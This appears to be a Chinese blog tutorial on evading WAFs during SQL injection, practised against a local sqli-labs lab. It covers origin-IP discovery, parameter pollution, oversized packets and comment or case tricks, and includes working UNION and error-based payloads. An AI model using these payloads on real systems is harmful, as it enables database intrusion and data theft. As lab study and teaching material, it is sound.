+<p>  主要针对的是云waf,找到源网站的真实地址,进行绕过,有点像CDN</p>
+<p>  1.发邮件：注册账户或者遇到一些异常是 通过邮件查看是否为真实服务器的IP</p>
+<p>  2.超级ping：对于某些偏远 用户访问量小的可能提供的服务是从真实服务器IP进行处理</p>
+<p>  3.海外服务：通过代理海外的IP去访问服务，如果企业没有海外CDN、云waf 可能就会提供真实的服务器IP进行处理</p>
+<p>  4.ico文件：获取云waf title 中的ico小图标 计算 Hash 值 通过fofa 查找 Hash值，如果有相同的那么另外一台或几台可能就是真实服务器的IP或者也有可能是另外一些云waf</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806032528802.png" alt="寻找源网站绕过wa检测"></p>
+<h4 id="通过同网段绕过Waf防护"><a href="#通过同网段绕过Waf防护" class="headerlink" title="通过同网段绕过Waf防护"></a>通过同网段绕过Waf防护</h4><blockquote>
+<p>  在一个网段中,可能经过的数据不会经过云Waf,从而实现绕过。 这里就需要能难到同网段的机器或者通过同网段的进行转发</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806034121720.png" alt="局域网绕过waf"></p>
+<h3 id="资源限制角度绕过waf"><a href="#资源限制角度绕过waf" class="headerlink" title="资源限制角度绕过waf"></a>资源限制角度绕过waf</h3><blockquote>
+<p>一般waf的执行需要优先考虑业务优先的原则,所以对于构造较大、超大数据包可能不会进行检测,从而实现绕过waf。</p>
+<p>Http Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。如：IE对URL长度的限制是2083字节(2K+35)。Google (chrome) URL最大长度限制为8182个字符。</p>
+<p>理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。如：在Tomcat下取消POST大小的限制（Tomcat默认2M）</p>
+</blockquote>
+<h4 id="post-传参"><a href="#post-传参" class="headerlink" title="post 传参"></a>post 传参</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 请求地址</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.151</span><span class="number">.5</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span></span><br><span class="line"><span class="comment">-- body 体</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806134649685.png" alt="post传参"></p>
+<h4 id="尝试查看库名"><a href="#尝试查看库名" class="headerlink" title="尝试查看库名"></a>尝试查看库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#请求的 body 体</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806135419421.png" alt="尝试查看库名失败 触发waf"></p>
+<h4 id="超大数据包-FIXME"><a href="#超大数据包-FIXME" class="headerlink" title="超大数据包-FIXME"></a>超大数据包-FIXME</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; /*超大数据包内容*/ union select 1,2,database() #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806182023815.png" alt="超大数据包"></p>
+<h3 id="协议层面绕过waf"><a href="#协议层面绕过waf" class="headerlink" title="协议层面绕过waf"></a>协议层面绕过waf</h3><h4 id="协议未覆盖绕过waf"><a href="#协议未覆盖绕过waf" class="headerlink" title="协议未覆盖绕过waf"></a>协议未覆盖绕过waf</h4><blockquote>
+<p>  比如由于业务需要,只对get型进行检测,post数据选择忽略 宝塔就是这个典型 那么对于那些既可以发起get又能通过post的就可以开始挑战了</p>
+</blockquote>
+<h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><blockquote>
+<p>  index?id&#x3D;18&amp;id&#x3D;2 waf可能只对id&#x3D;1进行检测  这个策略主要也是针对宝塔</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 执行此语句提示触发宝塔waf</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() <span class="comment">--+</span></span><br><span class="line"><span class="comment">-- 参数污染 通过加上多个重复的参数 去干扰 waf </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span>?id<span class="operator">=</span>?id<span class="operator">=</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806184442742.png" alt="宝塔参数污染"></p>
+<h3 id="规则层面的绕过waf"><a href="#规则层面的绕过waf" class="headerlink" title="规则层面的绕过waf"></a>规则层面的绕过waf</h3><h4 id="sql注释符绕过"><a href="#sql注释符绕过" class="headerlink" title="sql注释符绕过"></a>sql注释符绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="comment">/**/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h4><blockquote>
+<p>  对关键字监测的地方尝试用空白符隔开</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806191521792.png" alt="空白符"></p>
+<h4 id="函数分割符号"><a href="#函数分割符号" class="headerlink" title="函数分割符号"></a>函数分割符号</h4><blockquote>
+<p>将一个函数进行分割 concat()  %25其实就是百分号 %25A0 就是空白符<br>concat%2520<br>concat&#x2F;**&#x2F;(<br>concat%250c(<br>concat%25a0(</p>
+</blockquote>
+<h4 id="浮点数词法解释"><a href="#浮点数词法解释" class="headerlink" title="浮点数词法解释"></a>浮点数词法解释</h4><blockquote>
+<p>  waf 对于id&#x3D;1可以进行检测,但是对于d&#x3D;1E0、id&#x3D;1.0、id&#x3D;\N可能就无法检测</p>
+</blockquote>
+<h4 id="利用error-based进行sq注入"><a href="#利用error-based进行sq注入" class="headerlink" title="利用error- based进行sq注入"></a>利用error- based进行sq注入</h4><blockquote>
+<p>  报错注入现在 的时效性并不好了，基本上都能被waf拦截了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>, concat(<span class="number">0X5c</span>,md5(<span class="number">3</span>)));</span><br><span class="line">updatexml(<span class="number">1</span>, concat(<span class="number">0x5d</span>,md5(<span class="number">3</span>)),<span class="number">1</span>);</span><br><span class="line">GeometryCollection((<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span>@<span class="variable">@version</span>))f)x))</span><br><span class="line">polygon((<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> name_const(version(),<span class="number">1</span>))x))</span><br><span class="line">linestring()</span><br><span class="line">multipoint()</span><br><span class="line">multilinestring()</span><br><span class="line">multipolygon()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="mysql特殊语法"><a href="#mysql特殊语法" class="headerlink" title="mysql特殊语法"></a>mysql特殊语法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;x schema_name&#125; <span class="keyword">from</span> &#123;x information_schema.schemata&#125;;</span><br><span class="line"><span class="keyword">select</span>&#123;x <span class="number">1</span>&#125;</span><br><span class="line"><span class="keyword">select</span> &#123;xdsdsd database()&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/image-20210806192552178.png" alt="mysql特殊语法"></p>
+<h4 id="代码规则的waf"><a href="#代码规则的waf" class="headerlink" title="代码规则的waf"></a>代码规则的waf</h4><blockquote>
+<p><code>大小写绕过</code>:如果对关键字 and or union等进行了过滤,可以考虑使用大小写混合的方法 Or aNd UniOn 但是很多时候有函数会部分大小写进行过滤,这个时候我们可以考虑<br>使用双写的方法</p>
+<p><code>关键字重复</code>:OORr→or</p>
+<p><code>关键字替换</code>:如果还是无法绕过,可以考虑替换的方法 and→&amp;&amp;  or→|| like可以替换&#x3D;  &lt;&gt;等价于!&#x3D;</p>
+</blockquote>
+<h1 id="练习-TODO"><a href="#练习-TODO" class="headerlink" title="练习-TODO"></a>练习-TODO</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 拦截</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.151</span><span class="number">.5</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br><span class="line"><span class="string">-- 正常</span></span><br><span class="line"><span class="string">http://192.168.151.5/sqli/Less-1/?id=1&#x27;</span> <span class="keyword">union</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="comment">-- 正常</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.151</span><span class="number">.5</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; select  1,2,3 --+</span></span><br><span class="line"><span class="string">-- 正常</span></span><br><span class="line"><span class="string">http://192.168.151.5/sqli/Less-1/?id=1&#x27;</span> <span class="keyword">union</span> <span class="comment">/*select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="comment">-- 拦截</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.151</span><span class="number">.5</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union /*!select*/ 1,2,3 --+</span></span><br><span class="line"><span class="string">-- 正常</span></span><br><span class="line"><span class="string">http://192.168.151.5/sqli/Less-1/?id=1&#x27;</span> <span class="keyword">union</span> <span class="comment">/*!12345*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="comment">-- 拦截</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.151</span><span class="number">.5</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union /*!12345 database()*/ 1,2,3 --+</span></span><br><span class="line"><span class="string">-- 拦截</span></span><br><span class="line"><span class="string">http://192.168.151.5/sqli/Less-1/?id=1&#x27;</span> <span class="keyword">union</span> <span class="comment">/*!12345 select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/adaLogo.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/adaLogo.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">adalucky</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/')">SQL注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="Support Author"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>Donate</div><div class="reward-main"><div class="reward-all"><span class="reward-title">Thanks for your support</span><ul class="reward-group"><li class="reward-item"><a href="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/wechat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">Supporters</div><div class="reward-dec">Your support motivates me to write more 🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL注入&amp;url=http://example.com/2021/08/04/worker/Tester/Security/SQL%E6%B3%A8%E5%85%A5/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>SQL注入<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/WAF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>WAF<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/wechtdevtools.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/04/worker/Tester/Security/WAF/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">WAF识别</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/05/worker/Tester/Security/%E5%AE%89%E5%85%A8%E7%8B%97%E5%AE%89%E8%A3%85/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/security/securityDog.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">网站安全狗4.0</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/08/04/worker/Tester/Security/WAF/" title="WAF识别"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2021-08-04</div><div class="title">WAF识别</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> Comment</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/adaLogo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://automation-manage.oss-cn-shanghai.aliyuncs.com/blog/jqqdgzh.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text">前置准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E7%BD%AEsqli-labs%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.1.</span> <span class="toc-text">重置sqli-labs数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E6%95%B4php%E7%89%88%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">调整php版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA-sql-%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.3.</span> <span class="toc-text">输出 sql 语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Less-1%E7%9A%84%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">3.4.</span> <span class="toc-text">修改Less-1的请求方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A"><span class="toc-number">3.5.</span> <span class="toc-text">mysql中的注释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">3.5.1.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E8%A1%8C%E6%B3%A8%E9%87%8A"><span class="toc-number">3.5.2.</span> <span class="toc-text">多行注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%B3%A8%E9%87%8A"><span class="toc-number">3.5.3.</span> <span class="toc-text">特殊注释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E4%B8%AD%E7%9A%84%E6%8D%A2%E8%A1%8C"><span class="toc-number">3.6.</span> <span class="toc-text">mysql中的换行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">4.</span> <span class="toc-text">练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">白盒绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-id-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">执行 id&#x3D;1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-id-1%E2%80%99"><span class="toc-number">4.1.2.</span> <span class="toc-text">执行 id&#x3D;1’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cid-1%E2%80%99-orderby-1-%E2%80%93"><span class="toc-number">4.1.3.</span> <span class="toc-text">执行id&#x3D;1’ orderby 1 –+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%8F%8C%E5%86%99-oorrderby"><span class="toc-number">4.1.4.</span> <span class="toc-text">尝试双写 oorrderby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cid-1%E2%80%99-and-%E2%80%981%E2%80%99-%E2%80%991"><span class="toc-number">4.1.5.</span> <span class="toc-text">执行id&#x3D;1’ and ‘1’&#x3D;’1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%8F%8C%E5%86%99-aandnd"><span class="toc-number">4.1.6.</span> <span class="toc-text">尝试双写 aandnd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cunion-select%E5%9B%9E%E6%98%BE"><span class="toc-number">4.1.7.</span> <span class="toc-text">执行union select回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%94%AF%E6%8C%81%E5%9B%9E%E6%98%BE"><span class="toc-number">4.1.7.1.</span> <span class="toc-text">查看是否支持回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#union-select-%E5%9B%9E%E6%98%BE%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%9A%84%E5%BA%93"><span class="toc-number">4.1.7.2.</span> <span class="toc-text">union select 回显查询当前的库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%9A%84%E5%BA%93"><span class="toc-number">4.1.7.3.</span> <span class="toc-text">查看所有的库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bsecurity%E5%BA%93%E4%B8%8B%E7%9A%84%E8%A1%A8"><span class="toc-number">4.1.7.4.</span> <span class="toc-text">查看security库下的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Busers%E8%A1%A8%E6%9C%89%E5%93%AA%E4%BA%9B%E5%AD%97%E6%AE%B5"><span class="toc-number">4.1.7.5.</span> <span class="toc-text">查看users表有哪些字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bsecurity-users%E8%A1%A8%E4%B8%8B-username-password-%E7%9A%84%E5%80%BC"><span class="toc-number">4.1.7.6.</span> <span class="toc-text">查看security.users表下 username,password 的值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%BF%E4%B8%8A%E7%8E%AF%E5%A2%83%E7%BB%83%E4%B9%A0"><span class="toc-number">4.2.</span> <span class="toc-text">线上环境练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E9%83%BD%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.1.</span> <span class="toc-text">查看是都存在漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by%E6%9F%A5%E7%9C%8B%E6%9C%89%E5%A4%9A%E5%B0%91%E5%88%97"><span class="toc-number">4.2.2.</span> <span class="toc-text">order 